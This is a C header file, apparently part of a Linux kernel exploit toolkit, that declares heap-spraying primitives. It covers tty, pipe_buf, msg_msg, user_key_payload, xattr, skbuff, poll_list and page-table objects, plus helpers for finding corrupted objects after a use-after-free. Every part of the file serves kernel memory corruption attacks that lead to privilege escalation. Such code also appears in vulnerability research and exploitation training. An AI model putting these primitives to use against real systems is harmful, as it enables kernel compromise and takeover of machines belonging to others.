#ifndef _SPRAY_H_
#define _SPRAY_H_

#include <poll.h>
#include <stdatomic.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>

#define PTE_ENTRIES_PER_PAGE 512
#define PD_MAPPING_SIZE (PTE_ENTRIES_PER_PAGE * PAGE_SIZE)

extern int g_pipes[0x1000][0x02];
extern int g_qids[0x1000];
extern int g_keys[0x1000];
extern int g_seq_ops[0x10000];
extern int g_ptmx[0x1000];
extern int g_fds[0x1000];
extern int g_n_keys;
extern atomic_uint g_polls_ready;
extern atomic_uint g_polls_done;

typedef struct msg_msg_seg msg_msg_seg_t;
struct msg_msg_seg {
    msg_msg_seg_t *next;
};

struct rcu_head {
    void *next;
    void *func;
};

struct user_key_payload {
    struct rcu_head rcu;
    unsigned short datalen;
    char *data[];
};

typedef struct {
    struct rcu_head m_list;
    long m_type;
    size_t m_ts; /* message text size */
    struct msg_msgseg *next;
    void *security;
    /* the actual message follows immediately */
} msg_msg_t;

typedef int32_t key_serial_t;

typedef struct {
    struct poll_list *next;
    int len;
    struct pollfd entries[];
} poll_list_t;

typedef struct {
    int fd_read;
    unsigned amt;
    unsigned timeout;
    bool suspend;
} thread_args_t;

struct rb_node {
    unsigned long __rb_parent_color;
    struct rb_node *rb_right;
    struct rb_node *rb_left;
} __attribute__((aligned(sizeof(long))));

// tty struct
void alloc_tty(size_t i);
void free_tty(size_t i);

// pipe_buf
void alloc_pipe_buf(int i);
void release_pipe_buf(int i);

// user_key_payload
long free_key(int id);
long get_key(int i, char *buf, size_t sz);
void alloc_key(int id, char *buf, size_t size);

// msg_msg
void alloc_qid(int i);
void send_msg(int qid, int c, int size, long type);
void send_msg_payload(int qid, char *buf, int size, long type);
long recv_msg(int qid, void *data, int size, long type, bool copy);

// timer
// int create_timer(bool leak);
void alloc_timer(int i);
void free_timer(int i);

void alloc_file(int i);
void free_file(int i);

// xattr
void alloc_xattr(char *path, int i, void *val, size_t val_size,
                 size_t name_len);
void free_xattr(char *path, int i, size_t name_len);
void alloc_xattr_fd(int fd, int i, void *val, size_t val_size, size_t name_len);
void free_xattr_fd(int fd, int i, size_t name_len);

// page table spraying
void spray_pt(unsigned start, unsigned len);
void spray_pt_fd(unsigned start, unsigned len, int fd);
void unspray_pt(unsigned start, unsigned len);

int create_marker_file(void);
void map_marker_vmas(unsigned first, unsigned count, int marker_fd);
void fault_marker_slots(unsigned start, unsigned len, size_t uafed_obj_size);
uint8_t *search_marker_slots(unsigned start, unsigned len,
                             size_t uafed_obj_size, uint8_t *needle,
                             size_t needle_sz);
uint8_t *search_marker_slots_negative(unsigned start, unsigned len,
                                      size_t uafed_obj_size, uint8_t *needle,
                                      size_t needle_sz);

// skbuff
void alloc_skbuff_sock(int i);
void free_skbuff_sock(int i);
void write_skbuff(int idx, char *buf, size_t size);
void read_skbuff(int idx, char *buf, size_t size);

// poll list
void spray_poll_list(size_t i, size_t sz, int wake_fd);
void free_poll_lists(int wake_fd);

#endif // !_SPRAY_H_
